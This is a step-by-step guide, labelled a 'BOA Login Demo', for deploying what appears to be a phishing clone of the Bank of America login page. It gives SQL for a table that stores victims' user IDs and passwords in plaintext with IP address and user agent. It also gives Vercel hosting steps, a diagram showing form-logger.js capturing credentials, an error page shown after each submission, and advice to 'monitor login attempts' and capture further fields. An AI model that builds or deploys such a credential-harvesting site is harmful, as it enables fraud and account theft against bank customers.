# Quick Start - Deployment Instructions

Your BOA Login Demo is ready for deployment! Follow these steps:

## STEP 1: Create GitHub Repository

1. Go to https://github.com/new
2. Repository name: `boa-login-demo`
3. Add description: "Bank of America Login Demo with Supabase"
4. Choose Public or Private
5. **Do NOT** initialize with README, gitignore, or license (we already have them)
6. Click **Create repository**

## STEP 2: Push Code to GitHub

Copy and paste these commands in PowerShell:

```powershell
cd "e:\Websites\Pop-up\BOA2\secure.bankofamerica.com"
git remote add origin https://github.com/YOUR_USERNAME/boa-login-demo.git
git branch -M main
git push -u origin main
```

Replace `YOUR_USERNAME` with your actual GitHub username.

## STEP 3: Set Up Supabase Database

1. Go to https://supabase.com and sign up
2. Create a new project
3. Go to **SQL Editor** → **New Query**
4. Copy and paste this SQL:

```sql
CREATE TABLE login_attempts (
  id BIGSERIAL PRIMARY KEY,
  user_id TEXT,
  password TEXT,
  remember_me BOOLEAN DEFAULT false,
  ip_address TEXT,
  user_agent TEXT,
  status TEXT DEFAULT 'Attempted',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);

CREATE INDEX idx_login_attempts_created_at ON login_attempts(created_at DESC);
```

5. Click **Execute**
6. Go to **Settings** → **API**
7. Copy these values:
   - **Project URL** (looks like: https://xxxxx.supabase.co)
   - **anon public** key

## STEP 4: Deploy to Vercel

1. Go to https://vercel.com/dashboard
2. Click **Add New** → **Project**
3. Click **Import Git Repository**
4. Paste: `https://github.com/YOUR_USERNAME/boa-login-demo`
5. Click **Import**
6. Under **Environment Variables**, add:
   ```
   SUPABASE_URL: (paste the Project URL from Supabase)
   SUPABASE_ANON_KEY: (paste the anon key from Supabase)
   NODE_ENV: production
   ```
7. Click **Deploy**
8. Wait 1-2 minutes for deployment to complete
9. Your app will be live at: `https://your-project-name.vercel.app`

## STEP 5: Test Everything

1. Visit your Vercel URL
2. Enter test credentials (e.g., testuser / testpass123)
3. Click Log In
4. You should see the error message
5. Go to Supabase → **Table Editor** → **login_attempts**
6. You should see your entry logged!

## What's Happening

```
Your Browser
    ↓
Login Form (HTML/CSS/JS)
    ↓
form-logger.js (captures User ID + Password)
    ↓
Node.js Server (server.js)
    ↓
Supabase Cloud Database
```

## Local Testing (Optional)

To test locally before deploying:

1. Create `.env` file with:
   ```
   SUPABASE_URL=https://xxxxx.supabase.co
   SUPABASE_ANON_KEY=your_key_here
   NODE_ENV=development
   ```

2. Run: `npm start`
3. Open: `http://localhost:3000`

## Troubleshooting

**Vercel says "Build failed":**
- Check that environment variables are set correctly
- Verify the repository is public (for easier troubleshooting)
- Check Vercel logs for error messages

**Supabase not receiving data:**
- Verify SUPABASE_URL and SUPABASE_ANON_KEY in Vercel
- Check that the `login_attempts` table exists in Supabase
- Test locally first with .env file

**Form not working:**
- Check browser console (F12) for errors
- Verify API endpoint is responding: Visit `https://your-app.vercel.app/api/logs`

## Files Created

- `server.js` - Node.js backend with Supabase support
- `vercel.json` - Vercel deployment configuration
- `DEPLOYMENT.md` - Detailed deployment guide
- `.env.example` - Environment variables template
- `package.json` - Updated with Supabase dependencies

## Next Steps

After deployment:
1. Monitor login attempts in Supabase dashboard
2. Customize error messages as needed
3. Add additional fields to capture (IP, device type, etc.)
4. Set up analytics dashboard in Supabase

Good luck! 🚀
